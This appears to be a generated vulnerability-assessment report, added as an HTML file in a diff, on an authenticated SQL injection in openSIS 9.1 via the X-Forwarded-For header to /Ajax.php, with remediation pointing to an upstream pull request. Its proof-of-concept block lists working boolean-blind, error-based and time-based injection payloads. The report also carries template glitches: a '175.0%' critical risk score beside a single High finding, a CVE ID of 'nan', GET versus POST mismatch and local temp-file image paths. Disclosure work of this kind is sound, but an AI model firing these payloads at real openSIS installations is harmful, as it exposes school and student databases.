@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>openSIS 9.1 Security Assessment - Security Assessment Report</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: white;
+            padding: 0;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+        .header {
+            background-color: #205493;
+            color: white;
+            padding: 20px 40px;
+            border-bottom: 5px solid #112e51;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 28px;
+            font-weight: 600;
+        }
+        .header p {
+            margin: 5px 0 0 0;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        .header-meta {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .header-meta div {
+            font-size: 14px;
+        }
+        .main-content {
+            padding: 30px 40px;
+        }
+        h2 {
+            color: #205493;
+            border-bottom: 2px solid #dfe1e2;
+            padding-bottom: 8px;
+            margin-top: 30px;
+            font-weight: 600;
+        }
+        h3 {
+            color: #323a45;
+            margin-top: 25px;
+            font-weight: 600;
+        }
+        .summary-box {
+            background-color: #f1f1f1;
+            border-left: 5px solid #205493;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .confidential-statement {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border: 1px solid #ddd;
+            font-style: italic;
+            color: #555;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .risk-summary {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+        }
+        .risk-box {
+            background: white;
+            border: 1px solid #ddd;
+            padding: 20px;
+            border-radius: 5px;
+            width: 30%;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+            text-align: center;
+        }
+        .risk-level {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .risk-score {
+            font-size: 36px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        .chart-container {
+            margin: 30px 0;
+            text-align: center;
+        }
+        .chart-container img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+        .scope-item {
+            background: #f8f9fa;
+            padding: 10px 15px;
+            margin-bottom: 8px;
+            border-left: 3px solid #205493;
+        }
+        .methodology-list {
+            list-style-type: square;
+            padding-left: 25px;
+        }
+        .vulnerability-list {
+            margin-bottom: 40px;
+        }
+        .vulnerability-card {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        .vulnerability-header {
+            padding: 15px 20px;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .vulnerability-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin: 0;
+        }
+        .vulnerability-severity {
+            color: white;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .severity-Critical {
+            background-color: #dc3545;
+        }
+        .severity-High {
+            background-color: #fd7e14;
+        }
+        .severity-Medium {
+            background-color: #ffc107;
+            color: #212529;
+        }
+        .severity-Low {
+            background-color: #28a745;
+        }
+        .severity-Info {
+            background-color: #17a2b8;
+        }
+        .severity-Unknown {
+            background-color: #6c757d;
+        }
+        .vulnerability-body {
+            padding: 20px;
+        }
+        .vuln-section {
+            margin-bottom: 20px;
+        }
+        .vuln-section h4 {
+            margin: 0 0 10px 0;
+            color: #444;
+            font-size: 16px;
+        }
+        .vuln-section-content {
+            line-height: 1.6;
+        }
+        .cvss-visualization {
+            margin: 15px 0;
+            text-align: center;
+        }
+        .cvss-visualization img {
+            max-width: 100%;
+            height: auto;
+        }
+        .references {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-left: 3px solid #ddd;
+        }
+        .references ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+        .footer {
+            padding: 20px 40px;
+            background-color: #f0f0f0;
+            border-top: 1px solid #ddd;
+            text-align: center;
+            font-size: 14px;
+            color: #666;
+        }
+        .page-break {
+            page-break-after: always;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+            font-weight: 600;
+        }
+        code {
+            background: #f5f5f5;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            color: #d63384;
+        }
+        pre {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #ddd;
+        }
+        .affected-component {
+            display: inline-block;
+            background: #f0f0f0;
+            padding: 3px 8px;
+            border-radius: 3px;
+            margin-right: 5px;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        .toc {
+            background: #f8f9fa;
+            padding: 20px;
+            border: 1px solid #ddd;
+            margin-bottom: 30px;
+        }
+        .toc a {
+            color: #205493;
+            text-decoration: none;
+        }
+        .toc a:hover {
+            text-decoration: underline;
+        }
+        .toc ul {
+            padding-left: 25px;
+        }
+        .toc li {
+            margin-bottom: 8px;
+        }
+        .remediation-steps {
+            background: #f8f9fa;
+            padding: 15px;
+            border-left: 3px solid #28a745;
+        }
+        @media print {
+            body {
+                background-color: white;
+            }
+            .container {
+                box-shadow: none;
+                max-width: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>openSIS 9.1 Security Assessment</h1>
+            <p>Vulnerability Assessment & Penetration Testing Report</p>
+            <div class="header-meta">
+                <div>
+                    <strong>Client:</strong> OS4Ed<br>
+                    <strong>Date:</strong> 2025-03-12<br>
+                    <strong>Report ID:</strong> VAPT-20240909
+                </div>
+                <div>
+                    <strong>Prepared by:</strong> Devrim Dıragumandan (d0ub1edd)<br>
+                    <strong>Assessment Date:</strong> 2024-09-09
+                </div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="confidential-statement">
+                This report contains confidential information about the security posture of the client's systems.
+            </div>
+
+            <!-- Table of Contents -->
+            <div class="toc">
+                <h3>Table of Contents</h3>
+                <ul>
+                    <li><a href="#executive-summary">Executive Summary</a></li>
+                    <li><a href="#risk-assessment">Risk Assessment</a></li>
+                    <li><a href="#scope">Scope of Assessment</a></li>
+                    <li><a href="#methodology">Methodology</a></li>
+                    <li><a href="#findings">Detailed Findings</a>
+                        <ul>
+                            
+                            <li><a href="#vuln-1">openSIS 9.1 - SQL Injection (Authenticated)</a></li>
+                            
+                        </ul>
+                    </li>
+                    <li><a href="#conclusion">Conclusion</a></li>
+                </ul>
+            </div>
+
+            <h2 id="executive-summary">Executive Summary</h2>
+            <div class="summary-box">
+                A SQL injection vulnerability was identified in openSIS 9.1 via the 'X-Forwarded-For' header in POST requests to /Ajax.php. This vulnerability allows attackers to execute arbitrary SQL queries, potentially leading to unauthorized access to the database.
+            </div>
+
+            <h2 id="risk-assessment">Risk Assessment</h2>
+            <div class="risk-summary">
+                <div class="risk-box">
+                    <div>Overall Risk Level</div>
+                    <div class="risk-level" style="color: #dc3545;">
+                        Critical
+                    </div>
+                    <div class="risk-score" style="color: #dc3545;">
+                        175.0%
+                    </div>
+                </div>
+                <div class="risk-box">
+                    <div>Total Findings</div>
+                    <div class="risk-score">
+                        1
+                    </div>
+                    <div>
+                        
+                        
+                            <span class="vulnerability-severity severity-High">High: 1</span>
+                        
+                    </div>
+                </div>
+                <div class="risk-box">
+                    <div>Severity Distribution</div>
+                    <div>
+                        
+                        
+                        
+                    </div>
+                </div>
+            </div>
+
+            <!-- Charts Section -->
+            <div class="chart-container">
+                
+                <img src="C:\Users\hp\AppData\Local\Temp\tmp0gbll_w7\charts\severity_distribution.png" alt="Severity Distribution" />
+                
+            </div>
+            <div class="chart-container">
+                
+                <img src="C:\Users\hp\AppData\Local\Temp\tmp0gbll_w7\charts\severity_counts.png" alt="Vulnerability Counts" />
+                
+            </div>
+            <div class="chart-container">
+                
+            </div>
+
+            <h2 id="scope">Scope of Assessment</h2>
+            <p>The following assets were included in the scope of this security assessment:</p>
+            
+            <div class="scope-item">openSIS 9.1 web application</div>
+            
+
+            <h2 id="methodology">Methodology</h2>
+            <p>The assessment was conducted using the following methodology:</p>
+            <ul class="methodology-list">
+                
+                <li>Manual testing</li>
+                
+                <li>SQL injection testing</li>
+                
+            </ul>
+
+            <div class="page-break"></div>
+
+            <h2 id="findings">Detailed Findings</h2>
+            <div class="vulnerability-list">
+                
+                <div class="vulnerability-card" id="vuln-1">
+                    <div class="vulnerability-header">
+                        <h3 class="vulnerability-title">1. openSIS 9.1 - SQL Injection (Authenticated)</h3>
+                        <span class="vulnerability-severity severity-High">High</span>
+                    </div>
+                    <div class="vulnerability-body">
+                        
+                        <div class="vuln-section">
+                            <h4>CVSS Score: 8.8</h4>
+                            <div class="cvss-visualization">
+                                
+                                <img src="C:\Users\hp\AppData\Local\Temp\tmp0gbll_w7\charts\cvss_1.png" alt="CVSS Score Visualization" />
+                                
+                            </div>
+                        </div>
+                        
+
+                        
+                        <div class="vuln-section">
+                            <h4>CVE ID</h4>
+                            <div class="vuln-section-content">nan</div>
+                        </div>
+                        
+
+                        <div class="vuln-section">
+                            <h4>Description</h4>
+                            <div class="vuln-section-content">A SQL injection vulnerability exists in openSIS 9.1 via the 'X-Forwarded-For' header in POST requests to /Ajax.php. This allows attackers to execute arbitrary SQL queries.</div>
+                        </div>
+
+                        
+                        <div class="vuln-section">
+                            <h4>Affected Components</h4>
+                            <div class="vuln-section-content">
+                                
+                                <span class="affected-component">openSIS 9.1</span>
+                                
+                            </div>
+                        </div>
+                        
+
+                        <div class="vuln-section">
+                            <h4>Impact</h4>
+                            <div class="vuln-section-content">Unauthorized access to the database, potential data exfiltration.</div>
+                        </div>
+
+                        
+                        <div class="vuln-section">
+                            <h4>Proof of Concept</h4>
+                            <div class="vuln-section-content">
+                                <pre>GET /Ajax.php?modname=x HTTP/1.1\n\nParameter: X-Forwarded-For #1* ((custom) HEADER)\nType: boolean-based blind\nPayload: 127.0.0.2' AND EXTRACTVALUE(5785,CASE WHEN (5785=5785) THEN 5785 ELSE 0x3A END) AND 'HVwG'='HVwG\n\nType: error-based\nPayload: 127.0.0.2' AND GTID_SUBSET(CONCAT(0x717a787671,(SELECT (ELT(5261=5261,1))),0x71716b6b71),5261) AND 'djze'='djze\n\nType: time-based blind\nPayload: 127.0.0.2' AND (SELECT 5313 FROM (SELECT(SLEEP(5)))VeyP) AND 'ZIae'='ZIae</pre>
+                            </div>
+                        </div>
+                        
+
+                        <div class="vuln-section">
+                            <h4>Remediation</h4>
+                            <div class="remediation-steps">
+                                Apply the patch provided in the GitHub pull request: https://github.com/OS4ED/openSIS-Classic/pull/322.
+                            </div>
+                        </div>
+
+                        
+                        <div class="vuln-section">
+                            <h4>References</h4>
+                            <div class="references">
+                                <ul>
+                                    
+                                    <li>https://github.com/OS4ED/openSIS-Classic/releases/tag/V9.1</li>
+                                    
+                                    <li>https://github.com/OS4ED/openSIS-Classic/pull/322</li>
+                                    
+                                </ul>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+            </div>
+
+            <h2 id="conclusion">Conclusion</h2>
+            <p>
+                This report provides a comprehensive overview of the security vulnerabilities identified during the assessment. 
+                The findings have been prioritized based on their severity and potential impact on the organization.
+                It is recommended to address the Critical and High severity issues as soon as possible.
+            </p>
+            <p>
+                Regular security assessments should be conducted to maintain a strong security posture. 
+                Implementing the remediation steps provided in this report will significantly improve the overall security of the systems assessed.
+            </p>
+        </div>
+
+        <div class="footer">
+            <p>VAPT-20240909 | openSIS 9.1 Security Assessment | 2025-03-12</p>
+            <p>CONFIDENTIAL - FOR INTERNAL USE ONLY</p>
+        </div>
+    </div>
+</body>
+</html>
